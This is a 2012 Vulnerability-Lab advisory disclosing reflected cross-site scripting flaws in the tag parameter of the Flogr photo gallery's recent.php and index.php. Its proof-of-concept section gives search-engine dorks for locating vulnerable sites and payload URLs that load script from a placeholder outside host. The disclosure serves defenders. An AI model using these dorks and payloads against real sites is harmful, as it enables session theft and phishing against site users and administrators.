Title:
======
Flogr v2.5.6 & v2.3 - Cross Site Script Vulnerabilities


Date:
=====
2012-07-11


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=656


VL-ID:
=====
656


Common Vulnerability Scoring System:
====================================
2


Introduction:
=============
Flogr is a flexible script that displays your flickr photos in a customizable photo gallery you host on your website. 
If you use flickr but want to have a different look and feel for your photo gallery you may like flogr.

    Customizable photoblog interface for your flickr photos
    Display all flickr photos, only photos with certain tags or only certain photosets
    Displays photo details, EXIF data, tags, geo location, and photo comments
    Thumbnail viewer displays photos by date taken, photoset, and tag
    Embedded Slimbox photo slideshow
    Map view of your geo tagged photos
    Flickr tag cloud page
    RSS 2.0 support 

(Copy of the Vendor Homepage:  https://code.google.com/p/flogr/ )


Abstract:
=========
The Laboratory Researcher (Nafsh) Ehram Shahmohamadi (sec-lab.ir) discovered mutliple non persistent Cross Site Scripting 
Vulnerabilities in the Flogr v2.5.6 & v2.3 photo gallery CMS.


Report-Timeline:
================
2012-07-11:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium


Details:
========
Multiple non persistent cross site scripting vulnerabilities are detected in the Flogr v2.5.6 & v2.3 photo gallery CMS.
The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with high required 
user inter action or local low privileged user account. The vulnerabilities are located in the recent.php & index.php 
with the bound vulnerable tag parameter. Successful exploitation can result in account steal, phishing & client-side 
content request manipulation.


Vulnerable Module(s):
			[+] Recent Listing
			[+] Index Listing

Vulnerable File(s):
			[+] Recent.php
			[+] Index.php

Vulnerable Parameter(s):
			[+] Tag


Proof of Concept:
=================
Dork(s): 
inurl:"tag=" "powered by flogr v2.3"
inurl:"tag=" "powered by flogr v2.5.6"
inurl:"tag=" "powered by flogr v1.7" 

PoC:
http://[TARGET]/recent.php?tag=[CROSS SITE SCRIPTING]
http://[TARGET]/index.php?tag=[CROSS SITE SCRIPTING]

Reference(s):
xxx.com/recent.php?tag=%22%3E%3Cscript%20src%3d//xxx.com/s%3E%3C/script%3E
xxx.com/bigpictureproject/index.php?tag=<script src%3d//xxx.com/s></script>
xxx.com/flogr/recent.php?tag=<script src%3d//xxx.com/s></script>
xxx.com/recent.php?tag=%22%3E%3Cscript%20src%3d//xxx.com/s%3E%3C/script%3E


Risk:
=====
The security risk of the client side cross site scripting vulnerabilities are estimated as low(+)|(-)medium.


Credits:
========
Nafsh - Ehram Shahmohamadi - (research@sec-lab.ir) [www.sec-lab.ir] - TEAM K0242


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.

    				   	Copyright © 2012 | Vulnerability Laboratory



-- 
VULNERABILITY RESEARCH LABORATORY
LABORATORY RESEARCH TEAM
CONTACT: research@vulnerability-lab.com

